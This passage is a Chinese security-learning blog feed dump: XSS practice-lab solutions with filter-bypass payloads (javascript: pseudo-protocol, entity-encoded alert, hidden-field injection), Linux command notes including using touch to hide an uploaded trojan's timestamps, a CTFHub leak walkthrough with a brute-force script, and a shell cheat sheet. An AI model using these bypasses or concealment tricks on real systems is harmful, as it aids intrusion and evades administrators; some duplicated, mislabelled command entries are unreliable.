hrhrefef=javascriptipt:alert(1)&gt;aa&lt;/a&gt;</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145624818.png" alt="image-20230723145624818"></p><p>成功！</p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>这一关跟第七关相比，<code>&lt;script&gt;</code>被限制了，on事件也限制了</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723150209793.png" alt="image-20230723150209793"></p><blockquote><p><code>href有一个隐藏属性，会自动Unicode解码，可以利用Unicode编码绕过</code></p></blockquote><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723231149808.png" alt="image-20230723231149808"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723231249977.png" alt="image-20230723231249977"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><p>先输入上一道题的payload，会提示链接不合法。</p><p>看看里面源码，显示</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724215148579.png" alt="image-20230724215148579"></p><p>strops()函数返回字符串在另一关字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false。<code>函数对大小写敏感，用这个函数来判断字符串是否存在某个字符时必须使用===false</code></p><p>= 用于比较 判断 两者相等  ==在比较的时候可以自动换成数据类型</p><p>===用于严格比较 判断两者严格相等，严格比较不会进行自动转换，要求进行比较的操作数必须类型一致，不一致时返回flase</p><p>==值相等  ， ===值和类型相同</p><p>所以当我们输入第八关的payload时，该字符串没有包含题目的<code>http://</code>字符串，返回false，===比较值和类型，所以会打印<code>您的链接不合法</code>，</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725102329283.png" alt="image-20230725102329283"></p><p>我们想让伪协议和http://共存，可以把http注释掉，之所以不会出错是因为http://是个必须出现的字符，这个不是重要的字符，只要出现，并且不让后台读取就可以了</p><p>构造的payload：</p><pre><code>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029  //http://</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725104741241.png" alt="image-20230725104741241"></p><h2 id="level-10-隐藏表单字段注入"><a href="#level-10-隐藏表单字段注入" class="headerlink" title="level-10(隐藏表单字段注入)"></a>level-10(隐藏表单字段注入)</h2><p>查看源码，发现表单中的type属性值都是hidden（隐藏）</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724231311117.png" alt="image-20230724231311117"></p><p>我们可以尝试构造payload</p><pre><code>?t_link=222&amp;t_history=55&amp;t_sort=123</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725215159398.png" alt="image-20230725215159398"></p><p>看源码显示，只有t_sort显示出来，可以推出t_sort是xss的攻击点</p><p>先闭合引号和尖括号的payload</p><pre><code>&quot;onclick=&#39;alert(1)&#39;&gt;</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725220314548.png" alt="image-20230725220314548"></p><p>发现尖括号被过滤了，但是要实现xss还是要让type的hidden失效</p><p>怎么办呢？</p><blockquote><p>看到我们的xss攻击点在<code>type=&quot;hidden&quot;</code>前面，</p><p>所以考虑用html中的谁在前，谁优先的原则，</p><p>在其前面提前定义一个<code>type=&quot;text&quot;</code></p><p>使得<code>type=&quot;hidden&quot;</code>无效化，从而实现xss的目的</p></blockquote><pre><code>?t_sort=&quot;onclick=&#39;alert(1)&#39;  type=&#39;text&#39;</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725221100590.png" alt="image-20230725221100590"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725221235637.png" alt="image-20230725221235637"></p><p>看网站源码，</p><p>发现网站读取两个可控参数，keyword，t_sort</p><p>猜测xss攻击点在其中一个</p><p>但是keyword的$str被htmlspecialchars给转义了，所以无法实现xss</p><p>所以也可以推出t_sort才是xss攻击点，而且其赋值参数$str11只过滤了&lt;&gt;，然后直接插入页面中，从而推导出payload</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724235700474.png" alt="image-20230724235700474"></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2></script></p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Linux命令是用于实现某一类功能的指令或者程序，其命令的执行依赖于解释器程序，如bin/bash。</p><p><code>内部命令：安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。</code></p><p><code>外部命令：安装web应用程序的命令，大部分时对安装程序进行操作的。</code></p><h3 id="Linux命令的通用格式为："><a href="#Linux命令的通用格式为：" class="headerlink" title="Linux命令的通用格式为："></a>Linux命令的通用格式为：</h3><pre><code>命令关键字[选项] [参数]选项及参数含义：   -选项：用于调节命令的具体功能   -以“-”引导短格式选项（单个字符），比如“-l”   -以“--”引导长格式选项（多个字符），比如“--color”   -多个段格式选项可以写在一起，用一个“-”引导，比如“-al”参数：命令操作的对象，如文件、目录名等</code></pre><p>举例子，<code>ls -al /home</code>查看home目录信息。</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715152508816.png" alt="image-20230715152508816"></p><h3 id="Linux命令行编辑的几个辅助操作包括："><a href="#Linux命令行编辑的几个辅助操作包括：" class="headerlink" title="Linux命令行编辑的几个辅助操作包括："></a>Linux命令行编辑的几个辅助操作包括：</h3><p>tab键：自动补全</p><p>反斜杠“ \”:强制换行</p><p>快捷键ctrl + U：清空至行首</p><p>快捷键ctrl + K ：清空至行尾</p><p>快捷键ctrl + L ：清屏，类似于clear</p><p>快捷键ctrl + C：取消本次命令编辑，强制中断程序的执行</p><p>快捷键ctrl + Z ：强制中断任务</p><h3 id="常见的Linux命令"><a href="#常见的Linux命令" class="headerlink" title="常见的Linux命令"></a>常见的Linux命令</h3><h4 id="命令：help"><a href="#命令：help" class="headerlink" title="命令：help"></a>命令：help</h4><p>Linux内部帮助命令是help，其基本使用方法如下：</p><ul><li>help</li></ul><p>查看Bash内部命令的帮助信息</p><ul><li>命令 –help</li></ul><p>查看外部命令帮助信息，适合大多数外部命令</p><ul><li>使用man命令阅读手册页</li></ul><p>使用“↑”、“↓”方向键滚动文本，使用Page Up和Page Down键翻页，按Q或q键退出阅读环境，按“/”键后查看内容</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155028075.png" alt="image-20230715155028075"></p><h4 id="命令：uname"><a href="#命令：uname" class="headerlink" title="命令：uname"></a>命令：uname</h4><p>查看系统相关信息，常见命令选项：</p><p>-a ：显示主机名、内核版本、硬件平台等详细信息</p><p>-r ： 显示内核版本号</p><p><code>提权中可能会碰到uname命令。提权一般基于内核的本地溢出提权，如果想本地溢出，首先需要看到本地版本号</code></p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155950449.png" alt="image-20230715155950449"></p><h4 id="命令：hostname"><a href="#命令：hostname" class="headerlink" title="命令：hostname"></a>命令：hostname</h4><p>查看系统主机名，包括主机名称，所在域的名称</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160722996.png" alt="image-20230715160722996"></p><h4 id="命令：ifconfig"><a href="#命令：ifconfig" class="headerlink" title="命令：ifconfig"></a><strong>命令：ifconfig</strong></h4><p>查看系统IP信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160820826.png" alt="image-20230715160820826"></p><h4 id="命令：cat-proc-cpuinfo"><a href="#命令：cat-proc-cpuinfo" class="headerlink" title="命令：cat  /proc/cpuinfo"></a>命令：<strong>cat  /proc/cpuinfo</strong></h4><p>查看CPU信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161430568.png" alt="image-20230715161430568"></p><h4 id="命令：cat-proc-meminfo"><a href="#命令：cat-proc-meminfo" class="headerlink" title="命令：cat  /proc/meminfo"></a>命令：cat  /proc/meminfo</h4><p>查看内存信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161559159.png" alt="image-20230715161559159"></p><h3 id="目录操作命令-ls-cd-du-mkdir"><a href="#目录操作命令-ls-cd-du-mkdir" class="headerlink" title="目录操作命令 ls/cd/du/mkdir"></a>目录操作命令 ls/cd/du/mkdir</h3><h4 id="命令：pwd"><a href="#命令：pwd" class="headerlink" title="命令：pwd"></a>命令：pwd</h4><p>查看目录工具</p><h4 id="命令：cd"><a href="#命令：cd" class="headerlink" title="命令：cd"></a>命令：cd</h4><p>切换工作目录，其格式为：cd [目录位置]</p><p>相对路径</p><p>绝对路径</p><h4 id="命令：ls"><a href="#命令：ls" class="headerlink" title="命令：ls"></a>命令：ls</h4><p>用途：列表显示目录内容</p><p>ls [目录或文件名]</p><ul><li>-l：以长格式显示</li><li>-a：显示所有子目录和文件的信息，包括隐藏文件</li><li>-A：类似于“-a”，但不显示“.”和“…”目录的信息</li><li>-d：显示目录本身的属性</li><li>-h：以更易读的字节单位（K、M等）显示信息</li><li>-R：递归显示内容</li><li>–color：以颜色区分不同类型文件</li></ul><h4 id="常用组合：ls-al"><a href="#常用组合：ls-al" class="headerlink" title="常用组合：ls -al"></a>常用组合：ls -al</h4><p>在Linux系统中，ls相当于DOS命令中的dir，Linux的隐藏文件前面有个点“ .test” ,具体如下：</p><pre><code>ls查看当前目录ls /查看根目录或者文件ls -al查看文件所有信息，包括隐藏文件，并以长格式显示ls -lh /查看文件大小，以长格式显示</code></pre><p>在web渗透中，我们常用“ls  -al”命令查看文件的权限信息。</p><h4 id="命令：du"><a href="#命令：du" class="headerlink" title="命令：du"></a>命令：du</h4><p>用途：主要用于查看文件大小，统计目录及文件的空间占用情况（Eatimate file space usage）。</p><p>格式：du [选项]… [目录或文件名]</p><p>常用格式选项：</p><ul><li>-a：统计时包括所有的文件，而不仅仅只统计目录</li><li>-h：以更易读的字节单位（K、M等）显示信息</li><li>-s：只统计每个参数所占用空间总的大小</li></ul><h5 id="常用组合：du-sh"><a href="#常用组合：du-sh" class="headerlink" title="常用组合：du -sh"></a>常用组合：du -sh</h5><p>当我们拿到服务器之后，需要对源码进行打包或数据库进行脱库，如果库太大，Sqlmap可能会跑崩，可以尝试du查看大小“du -sh /”，再用“gzip”压缩打包下载</p><h4 id="命令：mkdir"><a href="#命令：mkdir" class="headerlink" title="命令：mkdir"></a>命令：mkdir</h4><p>用途：常见命令，用于创建新的目录</p><p>格式：mkdir [-p] [/路径]目录名</p><p>常用命令：递归创建目录mkdir -p /csdn/eastmount</p><p>当我们调用“mkdir  /cdsn/eastmount ”时会报错，因为跟目录下没有“csdn”目录。如果想要连续递归创建多个目录，则需要增加“-p”参数，即“mkdir -p</p><p>/csdn/eastmount”</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225441390.png" alt="image-20230715225441390"></p><p>如果想要连续创建两个目录，则使用如下方法：</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225556094.png" alt="image-20230715225556094"></p><h3 id="文件操作命令touch-vim-cp-rm-mv-find"><a href="#文件操作命令touch-vim-cp-rm-mv-find" class="headerlink" title="文件操作命令touch/vim/cp/rm/mv/find"></a>文件操作命令touch/vim/cp/rm/mv/find</h3><h4 id="命令：touch"><a href="#命令：touch" class="headerlink" title="命令：touch"></a>命令：touch</h4><p>用途：新建空文件，或更新文件时间标记</p><p>格式：touch 文件名</p><p>如果文件不存在则创建文件；如果文件存在，该命令的另一个作用是更新日期。在web渗透中，该命令可以硬核的帮助我们创建文件或隐藏东西。比如我们上传了一个木马，它会有相应的新建日期，管理员很容易发现这些异常文件或信息。我们可以尝试将所有文件都更新到最新日期，调用“touch /var/www/html/*”命令实现，但其效果肯定不好，后面随着深入，会分享更好的方法</p><p>   <img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231549659.png" alt="image-20230715231549659">        </p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231810225.png" alt="image-20230715231810225"></p><h4 id="命令：ln"><a href="#命令：ln" class="headerlink" title="命令：ln"></a>命令：ln</h4><p>用途：为文件或目录创建链接，即快捷方式</p><p>格式：ln [-s]源文件或目录..链接文件或目标目录</p><p>常用格式选项：</p><p>-s：建立符号链接文件</p><h4 id="命令：cp"><a href="#命令：cp" class="headerlink" title="命令：cp"></a>命令：cp</h4><p>用途：复制文件或目录</p><p>格式：cp [选项] …源文件目录或目录  目录文件或目标目录</p><p>常用格式选项：</p><p>-r：递归复制整个目录树</p><p>-p：保持源文件的属性不变</p><p>-f：强制覆盖目标同名文件或目录,根目录是略过目录时使用。</p><p>-i：需要覆盖文件或目录时进行提醒</p><p>复制文件至指定位置：cp test.txt/var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111138655.png" alt="image-20230716111138655"></p><p>如果我们需要复制目录的话，需要增加一个递归复制参数“-r” ，比如： cp -r cdsn /var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111950239.png" alt="image-20230716111950239"></p><h4 id="命令：rm"><a href="#命令：rm" class="headerlink" title="命令：rm"></a>命令：rm</h4><p>用途：删除文件或目录</p><p>格式：rm [选项] .. 文件或目录</p><p>常用格式选项：</p><p>-f：强制删除文件或目录，不进行提醒</p><p>-i：删除文件或目录时提醒用户确认</p><p>-r: 递归删除整个目录树</p><p>常用命令：递归强制删除整个目录rm-rf，但需慎用</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716113119175.png" alt="image-20230716113119175"></p><h4 id="命令：mv"><a href="#命令：mv" class="headerlink" title="命令：mv"></a>命令：mv</h4><p>用途：移动文件或目录，相当于剪切，如果目标位置与源位置相同，相当于重命名</p><p>格式：mv [选项] …源文件或目录  目标文件或目录</p><p>移动至“csdn”文件夹，如：mv  yl.txt/csdn</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716133231434.png" alt="image-20230716133231434"></p><p>重命名文件，如：mv  yl.txt  test.txt</p><h4 id="命令：find"><a href="#命令：find" class="headerlink" title="命令：find"></a>命令：find</h4><p>用途：用于查找文件或目录，取证也常用该命令</p><p>格式：find [查找范围] [查找条件]</p><p>常用格式选项：</p><p>-name: 按文件名称查找</p><p>-size：按文件大小查找</p><p> -user：按文件属性查找</p><p>-type：按文件类型查找</p><p>通过名字查某目录下所有文件，如：<code>find  /etc -name  &quot;m*.conf&quot;</code>,注意“*”表示通配符</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716231407108.png" alt="image-20230716231407108"></p><p>查找网站根目录下哪些文件是root，如：find / -user root</p><p>在Web渗透中，当某人上传文件并修改为root权限，我们管理员可以通过该命令查找来发现可疑文件，判断服务器是否被攻击。</p><p>4.文本编辑查看命令vim/cat/wc</p><p>命令：vi</p><p>用途：该命令是一个较大的UNIX命令</p>]]></content>
      
      
      <categories>
          
          <category> 命令学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub</title>
      <link href="/2023/07/12/ctfhub/"/>
      <url>/2023/07/12/ctfhub/</url>
      
        <content type="html"><![CDATA[<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><h6 id="1-有两层目录，一个一个试，一共有4-4种尝试方式，找到flag-txt"><a href="#1-有两层目录，一个一个试，一共有4-4种尝试方式，找到flag-txt" class="headerlink" title="1.有两层目录，一个一个试，一共有4*4种尝试方式，找到flag.txt"></a>1.有两层目录，一个一个试，一共有4*4种尝试方式，找到flag.txt</h6><p><img src="/2023/07/12/ctfhub/image-20230713092337772.png" alt="image-20230713092337772"></p><h6 id="2-用python脚本"><a href="#2-用python脚本" class="headerlink" title="2.用python脚本"></a>2.用python脚本</h6><pre><code># 访问目录遍历，/1/1,/1/2，，，/4/4，读取响应有无flag.txt，有则输出目录路径import requestsurl = &quot;http://challenge-df1916128f6a845f.sandbox.ctfhub.com:10800/flag_in_here/&quot;for i in range(1, 5):    for j in range(1, 5):        url1 = url + str(i) + &quot;/&quot; + str(j) + &quot;/flag.txt&quot;        # 读取响应页面中有无flag.txt，有则打印url        if &quot;ctfhub&#123;&quot; in requests.get(url1).text:            #直接打出flag.txt的内容            print(requests.get(url1).text)            break</code></pre><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><h6 id="ctrl-F-查找关键字flag"><a href="#ctrl-F-查找关键字flag" class="headerlink" title="ctrl+F 查找关键字flag"></a>ctrl+F 查找关键字flag</h6><p><img src="/2023/07/12/ctfhub/image-20230713161017017.png" alt="image-20230713161017017"></p><h3 id="备份文件下载-网站源码"><a href="#备份文件下载-网站源码" class="headerlink" title="备份文件下载-网站源码"></a>备份文件下载-网站源码</h3><p><img src="/2023/07/12/ctfhub/image-20230713161337694.png" alt="image-20230713161337694"></p><h3 id><a href="#" class="headerlink" title></a></h3><h6 id="常见的一些网站源码下载文件后缀和文件名。"><a href="#常见的一些网站源码下载文件后缀和文件名。" class="headerlink" title="常见的一些网站源码下载文件后缀和文件名。"></a>常见的一些网站源码下载文件后缀和文件名。</h6><h6 id="1-使用dirsearsh扫描"><a href="#1-使用dirsearsh扫描" class="headerlink" title="1.使用dirsearsh扫描"></a>1.使用dirsearsh扫描</h6><h6 id="2-访问www-zip文件"><a href="#2-访问www-zip文件" class="headerlink" title="2.访问www.zip文件"></a>2.访问<a href="http://www.zip文件/">www.zip文件</a></h6><p><img src="/2023/07/12/ctfhub/image-20230713164646825.png" alt="image-20230713164646825"></p><h6 id="打开记事本，发现"><a href="#打开记事本，发现" class="headerlink" title="打开记事本，发现"></a>打开记事本，发现</h6><p><img src="/2023/07/12/ctfhub/image-20230713164750008.png" alt="image-20230713164750008"></p><h6 id="尝试再网站上访问，得到flag"><a href="#尝试再网站上访问，得到flag" class="headerlink" title="尝试再网站上访问，得到flag"></a>尝试再网站上访问，得到flag</h6><p><img src="/2023/07/12/ctfhub/image-20230713165051679.png" alt="image-20230713165051679"></p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>1.根据提示访问index.php.bak文件</p><p><img src="/2023/07/12/ctfhub/image-20230713170128212.png" alt="image-20230713170128212"></p><p>下载并查看</p><p><img src="/2023/07/12/ctfhub/image-20230713170638785.png" alt="image-20230713170638785"></p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>原理：在开发人员使用‘vim编辑器’编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，元文件会更新，备份文件会被自动删除。</p><p>但是当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p><p>以index.php为例</p><p>第一次产生的交换文件名为 <code>.index.php.swp</code></p><p>再次意外退出后，将会产生的交换文件名为 <code>.index.php.swo</code></p><p>第三次产生的交换文件名 <code>.index.php.swn</code></p><p>这些隐藏文件的作用：<code>可用来恢复意外退出文件</code></p><h6 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h6><p><code>swp</code>备份文件就是隐藏文件，操作时需要在文件名前<code>.</code></p><p>针对<code>swp</code>备份文件，可以使用vim -r filename命令来恢复文件</p><p>（<code>vim</code>使用的缓存存储为一种固定的二进制文件。而一般编辑的字符是明文可见字符，在vim的缓存中这些可见字符会原样保留，所以显示出来的是乱码。）</p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title="DS_Store"></a>DS_Store</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><pre><code>访问url/.DS_Store</code></pre><p>下载DS_Store文件</p><p>把文件放入Linux里面，cat里面有文件路径</p><h3 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h3><h4 id="log"><a href="#log" class="headerlink" title="log"></a>log</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将<code>.git</code>文件夹直接部署到线上环境。这就引起了git 泄露漏洞。</p><p>GitHack是一个<code>.git</code>泄露利用测试脚本，通过泄露文件，还原重建工程源代码。</p><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>1.解析<code>.git/index</code>文件，找到工程中所有的:(文件名，文件)</p><p>2.去<code>.git/objects/</code>文件夹下下载对应的文件</p><p>3.<code>zlib</code>解压文件，按原始的目录结构写入源代码</p><p>优点</p><p>速度快，默认20个工作线程</p><p>尽量还原所有</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/22/%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/06/22/%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="1-命令格式和基础命令"><a href="#1-命令格式和基础命令" class="headerlink" title="1.命令格式和基础命令"></a>1.命令格式和基础命令</h2><p>Linux命令是用于实现某一类功能的指令或程序，其命令的执行依赖于解释器程序，如/bin/bash。</p><ul><li><strong>内部命令：</strong>安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。</li><li><strong>外部命令：</strong>安装Web应用程序产生的命令，大部分是对安装程序进行操作的。</li></ul><p>Linux命令的通用格式为：</p><pre><code class="text">命令关键字 [选项] [参数]选项及参数含义：    - 选项：用于调节命令的具体功能    - 以“-”引导短格式选项（单个字符），比如“-l”    - 以“--”引导长格式选项（多个字符），比如“--color”    - 多个段格式选项可以写在一起，用一个“-”引导，比如“-al”参数：命令操作的对象，如文件、目录名等</code></pre><p>举个例子，“ls -al /home”查看home目录信息。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="shell常用命令"><a href="#shell常用命令" class="headerlink" title="shell常用命令"></a>shell常用命令</h1><p><strong>前言</strong></p><p>使用Linux  shell是一些程序员每天的基本工作，但我们经常会忘记一些有用的shell命令和技巧。当然，命令我能记住，但我不敢说能记得如何用它执行某个特定任务。需要注意一点的是，有些用法需要在你的Linux系统里安装额外的软件。下面话不多说了，来看看详细的内容吧。</p><p><strong>检查远程端口是否对bash开放：</strong></p><pre><code class="text">echo &gt;/dev/tcp/8.8.8.8/53 &amp;&amp; echo &quot;open&quot;</code></pre><p><strong>让进程转入后台：</strong></p><pre><code class="text">Ctrl + z</code></pre><p><strong>产生随机的十六进制数，其中n是字符数：</strong></p><pre><code class="text">openssl rand -hex n</code></pre><p><strong>在当前shell里执行一个文件里的命令：</strong></p><pre><code class="text">source /home/user/file.name</code></pre><p><strong>截取前5个字符：</strong></p><pre><code class="text">$&#123;variable:0:5&#125;</code></pre><p><strong>SSH debug 模式:</strong></p><pre><code class="text">ssh -vvv user@ip_address</code></pre><p><strong>SSH with pem key:</strong></p><pre><code class="text">ssh user@ip_address -i key.pem</code></pre><p><strong>用wget抓取完整的网站目录结构，存放到本地目录中：</strong></p><pre><code class="text">wget -r --no-parent --reject &quot;index.html*&quot; http://hostname/ -P /home/user/dirs</code></pre><p><strong>一次创建多个目录：</strong></p><pre><code class="text">mkdir -p /home/user/&#123;test,test1,test2&#125;</code></pre><p><strong>列出包括子进程的进程树：</strong></p><pre><code class="text">ps axwef</code></pre><p><strong>创建 war 文件:</strong></p><pre><code class="text">jar -cvf name.war file</code></pre><p><strong>测试硬盘写入速度：</strong></p><pre><code class="text">dd if=/dev/zero of=/tmp/output.img bs=8k count=256k; rm -rf /tmp/output.img</code></pre><p><strong>测试硬盘读取速度：</strong></p><pre><code class="text">hdparm -Tt /dev/sda</code></pre><p><strong>获取文本的md5 hash：</strong></p><pre><code class="text">echo -n &quot;text&quot; | md5sum</code></pre><p><strong>检查xml格式：</strong></p><pre><code class="text">xmllint --noout file.xml</code></pre><p><strong>将tar.gz提取到新目录里：</strong></p><pre><code class="text">tar zxvf package.tar.gz -C new_dir</code></pre><p><strong>使用curl获取HTTP头信息：</strong></p><pre><code class="text">curl -I http://www.example.com</code></pre><p><strong>修改文件或目录的时间戳(YYMMDDhhmm):</strong></p><pre><code class="text">touch -t 0712250000 file</code></pre><p><strong>用wget命令执行ftp下载：</strong></p><pre><code class="text">wget -m ftp://username:password@hostname</code></pre><p><strong>生成随机密码(例子里是16个字符长):</strong></p><pre><code class="text">LANG=c &lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c$&#123;1:-16&#125;;echo;</code></pre><p><strong>快速备份一个文件：</strong></p><pre><code class="text">cp some_file_name&#123;,.bkp&#125;</code></pre><p><strong>访问Windows共享目录：</strong></p><pre><code class="text">smbclient -U &quot;DOMAIN\user&quot; //dc.domain.com/share/test/dir</code></pre><p><strong>执行历史记录里的命令(这里是第100行):</strong></p><pre><code class="text">!100</code></pre><p><strong>解压:</strong></p><pre><code class="text">unzip package_name.zip -d dir_name</code></pre><p><strong>输入多行文字(CTRL + d 退出):</strong></p><pre><code class="text">cat &gt; test.txt</code></pre><p><strong>创建空文件或清空一个现有文件：</strong></p><pre><code class="text">\&gt; test.txt</code></pre><p><strong>与Ubuntu NTP server同步时间：</strong></p><pre><code class="text">ntpdate ntp.ubuntu.com</code></pre><p><strong>用netstat显示所有tcp4监听端口：</strong></p><pre><code class="text">netstat -lnt4 | awk &#39;&#123;print $4&#125;&#39; | cut -f2 -d: | grep -o &#39;[0-9]*&#39;</code></pre><p><strong>qcow2镜像文件转换：</strong></p><pre><code class="text">qemu-img convert -f qcow2 -O raw precise-server-cloudimg-amd64-disk1.img \precise-server-cloudimg-amd64-disk1.raw</code></pre><p><strong>重复运行文件，显示其输出（缺省是2秒一次）：</strong></p><pre><code class="text">watch ps -ef</code></pre><p><strong>所有用户列表：</strong></p><pre><code class="text">getent passwd</code></pre><p><strong>Mount root in read/write mode:</strong></p><pre><code class="text">mount -o remount,rw /</code></pre><p><strong>挂载一个目录（这是不能使用链接的情况）:</strong></p><pre><code class="text">mount --bind /source /destination</code></pre><p><strong>动态更新DNS server:</strong></p><pre><code class="text">nsupdate &lt; &lt;EOF update add $HOST 86400 A $IP send EOF</code></pre><p><strong>递归grep所有目录：</strong></p><pre><code class="text">grep -r &quot;some_text&quot; /path/to/dir</code></pre><p><strong>列出前10个最大的文件：</strong></p><pre><code class="text">lsof / | awk &#39;&#123; if($7 &gt; 1048576) print $7/1048576 &quot;MB &quot;$9 &#125;&#39; | sort -n -u | tail</code></pre><p><strong>显示剩余内存(MB):</strong></p><pre><code class="text">free -m | grep cache | awk &#39;/[0-9]/&#123; print $4&quot; MB&quot; &#125;&#39;</code></pre><p><strong>打开Vim并跳到文件末：</strong></p><pre><code class="text">vim + some_file_name</code></pre><p><strong>Git 克隆指定分支(master):</strong></p><pre><code class="text">git clone git@github.com:name/app.git -b master</code></pre><p><strong>Git 切换到其它分支(develop):</strong></p><pre><code class="text">git checkout develop</code></pre><p><strong>Git 删除分支(myfeature):</strong></p><pre><code class="text">git clone git@github.com:name/app.git -b master</code></pre><p><strong>Git 切换到其它分支(develop):</strong></p><pre><code class="text">git checkout develop</code></pre><p><strong>Git 删除分支(myfeature):</strong></p><pre><code class="text">git branch -d myfeature</code></pre><p><strong>Git 删除远程分支</strong></p><pre><code class="text">git push origin :branchName</code></pre><p><strong>Git 将新分支推送到远程服务器：</strong></p><pre><code class="text">git push -u origin mynewfeature</code></pre><p><strong>打印历史记录中最后一次cat命令：</strong></p><pre><code class="text">!cat:p</code></pre><p><strong>运行历史记录里最后一次cat命令：</strong></p><pre><code class="text">!cat</code></pre><p><strong>找出/home/user下所有空子目录:</strong></p><pre><code class="text">find /home/user -maxdepth 1 -type d -empty</code></pre><p><strong>获取test.txt文件中第50-60行内容：</strong></p><pre><code class="text">&lt; test.txt sed -n &#39;50,60p&#39;</code></pre><p><strong>运行最后一个命令(如果最后一个命令是mkdir /root/test, 下面将会运行: sudo mkdir /root/test)：</strong></p><pre><code class="text">sudo !!</code></pre><p><strong>创建临时RAM文件系统 – ramdisk (先创建/tmpram目录):</strong></p><pre><code class="text">mount -t tmpfs tmpfs /tmpram 